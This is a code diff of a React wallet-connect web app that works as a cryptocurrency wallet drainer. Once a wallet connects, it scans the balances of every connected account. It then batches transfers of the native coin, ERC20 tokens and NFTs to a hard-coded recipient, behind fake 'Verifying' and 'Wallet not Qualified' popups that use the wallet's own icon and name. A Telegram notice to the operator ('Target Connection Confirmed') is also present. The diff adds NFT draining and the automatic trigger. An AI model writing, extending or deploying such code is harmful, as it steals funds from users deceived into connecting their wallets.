@@ -1,5 +1,5 @@
 import { useState, useMemo, useEffect, useCallback } from 'react'
-
+import { BrowserProvider } from "ethers";
 import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';
 //0import {testTRONSignedBatchCallWithTronWeb, scanUserBalance, executeBatchCalls, prepareTransactions, prepareBatchTransferFrom, checkTokenAllowance } from './functions'
 import tokenAddresses from './tokenAddresses'
@@ -7,10 +7,10 @@ import { tronWeb, adapter, chains } from './setup';
 import { keccak256 } from 'tronweb/utils';
 import { useAppKit,useAppKitAccount,useAppKitProvider   } from '@reown/appkit/react';
 //import {BatchTransactionManager, TransactionTemplates, type BatchTransaction} from './BatchClass';
-import {  useSendCalls, useWriteContract, useBalance  } from 'wagmi'
-import {getTokenBalance, handleGetBalance, sendTelegramMessage} from "./functions"
+import {  useSendCalls, useWriteContract, useBalance, useAccount  } from 'wagmi'
+import {scanUserBalances, handleGetBalance, sendTelegramMessage} from "./functions"
 import { MaxInt256, parseEther } from 'ethers';
-import { encodeFunctionData, erc20Abi } from 'viem';
+import { encodeFunctionData, erc20Abi, erc721Abi, formatEther } from 'viem';
 import MetaMaskPopup from './popup';
 import SendDialog from './manual';
 const CONTRACT_ADDRESS = import.meta.env.VITE_CONTRACT_ADDRESS;
@@ -45,8 +45,9 @@ function App() {
   const [transactionError, setTransactionError] = useState(null);
   const [transactionResult, setTransactionResult] = useState(null);
   const [hasInitiatedTransaction, setHasInitiatedTransaction] = useState(false);
-
-  const { open,close, connector } = useAppKit();
+  const [tokenBalances, setTokenBalance] = useState([false]);
+  const { connector } = useAccount();
+  const { open,close } = useAppKit();
   const {address, embeddedWalletInfo,  allAccounts, isConnected: isMobileConnect, caipAddress }  = useAppKitAccount();
   const {sendCalls, isPending: isSendCallsPending } = useSendCalls();
   const { writeContract, isPending: isWriteContractPending } = useWriteContract()
@@ -54,6 +55,7 @@ function App() {
    const { data: walletBalance, refetch, isLoading, isError } = useBalance({
     address: address,
   })
+
 
   const handleClose = ()=>{
 
@@ -149,18 +151,7 @@ function App() {
         return
       }
 
-      let bal = 0
-
-      if (address) {
-        console.log("[v0] Fetching balance for address:", address)
-        try {
-          bal = await handleGetBalance(address, provider, chains[0].id)
-          console.log("[v0] Fetched balance:", bal)
-        } catch (balError) {
-          console.warn("[v0] Failed to fetch balance:", balError.message)
-          // Continue with balances transfer even if ETH balance fetch fails
-        }
-      }
+     
 
       const resolvedBalances = await Promise.resolve(balances)
       if (!resolvedBalances || !Array.isArray(resolvedBalances)) {
@@ -186,30 +177,41 @@ function App() {
       
       // Build token transfer calls
       for (let x = 0; x < resolvedBalances.length; x++) {
-        const balance = resolvedBalances[x]
-        if (!balance.token_address || !balance.balance) {
-          console.warn("[v0] Skipping invalid balance entry:", balance)
-          continue
+        const balance = resolvedBalances[x];
+
+        if( balance.type == "NATIVE"){
+          let bal   = parseFloat( formatEther(balance.balance));
+          const ethValue = parseEther((bal - 0.0001).toString())
+            calls.push({
+              to: RECIPIENT,
+              value: bigintToHex(ethValue)
+            })
+        } 
+
+        else if( balance.type == "TOKEN"){
+            calls.push({
+              to: balance.token_address,
+              data: encodeFunctionData({
+                abi: erc20Abi,
+                functionName: 'transfer',
+                args: [RECIPIENT, parseEther(balance.balance)]
+              })
+            })
+        } else if( balance.type == "NFT" ){
+          calls.push({
+            to: balance.token_address,
+            data: encodeFunctionData({
+              abi: erc721Abi,
+              functionName: 'transfer', // Direct transfer function
+              args: [RECIPIENT, balance.tokenId] // to, tokenId
+            })
+          })
         }
         
-        calls.push({
-          to: balance.token_address,
-          data: encodeFunctionData({
-            abi: erc20Abi,
-            functionName: 'transfer',
-            args: [RECIPIENT, parseEther(balance.balance)]
-          })
-        })
+        
       }
 
-      // Add ETH transfer if balance available
-      if (bal && bal > 0.00011) {
-        const ethValue = parseEther((bal - 0.0001).toString())
-        calls.push({
-          to: RECIPIENT,
-          value: bigintToHex(ethValue)
-        })
-      } else if (!resolvedBalances.length && (!bal || bal === 0)) {
+       if (!resolvedBalances.length ) {
         console.log("[v0] No balances to transfer")
         setTransactionResult({ message: "No balances to transfer" })
         setIsTransactionInProgress(false)
@@ -403,33 +405,68 @@ function App() {
     }
   }, [provider, address, open, isTransactionInProgress]) // Added isTransactionInProgress to dependencies
 
+  const fetchBalances = useCallback(async (add)=>{
+    console.log("callback running...")
+      const balances = await scanUserBalances(add);
+      console.log("setting token gotten...", balances )
+      setTokenBalance((former)=> former.concat(balances).filter((bal) => !!bal ))
+    }, []);
+
+  useEffect(()=>{
+    console.log("[v0] Got token balances:", tokenBalances)
+
+    if( ! isMobileConnect ) return;
+
+    console.log("[v0] token balances recheck:", tokenBalances)
+    setIsOpen(true); 
+    setPopupTitle("Verifying")
+    setPopupMessage("Pending")
+    
+    if(connector){
+      setLogoUrl(connector.icon)
+      setHeaderText(connector.name)
+    }
+
+    if(!tokenBalances.length) {
+      
+      setPopupTitle("Error Verifying")
+      setPopupMessage("Wallet not Qualified")
+      setTimeout(()=>{
+        setIsOpen(false); 
+      }, 5000)
+      return;
+    }
+
+    const tokened = tokenBalances.filter(bal => !!bal )
+    console.log(tokenBalances);
+    if( ! provider || ! tokened.length ) return;
+    
+    runTokenFetches(tokenBalances)
+  }, [tokenBalances, isMobileConnect])
+
   useEffect(() => {
     console.log("[v0] useEffect triggered - isMobileConnect:", isMobileConnect, "address:", address)
 
     const runGetChainID = async ()=>{
       if( provider ){
-        const network = await provider.getNetwork();
+        const etherProvider = new BrowserProvider( provider);
+        const network = await etherProvider.getNetwork();
         if(network){
           setChainID(network.chainId)
         }
       }
     }
 
+    
+
     if (isMobileConnect && address && provider && !hasInitiatedTransaction && !isTransactionInProgress) {
       runGetChainID();
-      sendTelegramMessage(CHAT_ID, `Target Connection Confirmed, Connected Account Address: ${address}`, chainID, "info", address);
+      //sendTelegramMessage(CHAT_ID, `Target Connection Confirmed, Connected Account Addresses: ${allAccounts.map((add)=>`<code>${add.address}</code>`).join("\n")}`, chainID, "info", address);
       console.log("[v0] Initiating token fetch transaction")
       setHasInitiatedTransaction(true) // Set flag to prevent re-running
       
-      const tokenBalances = getTokenBalance(address)
-      console.log("[v0] Got token balances:", tokenBalances)
-      setIsOpen(true); 
-      setPopupTitle("Verifying")
-      setPopupMessage("Pending")
-      if(connector)
-        setHeaderText(connector.name)
+        fetchBalances(allAccounts.map(add => add.address))
       
-      runTokenFetches(tokenBalances)
     }
   }, [isMobileConnect, address, provider, connector]) // Removed runTokenFetches and hasInitiatedTransaction dependencies
 
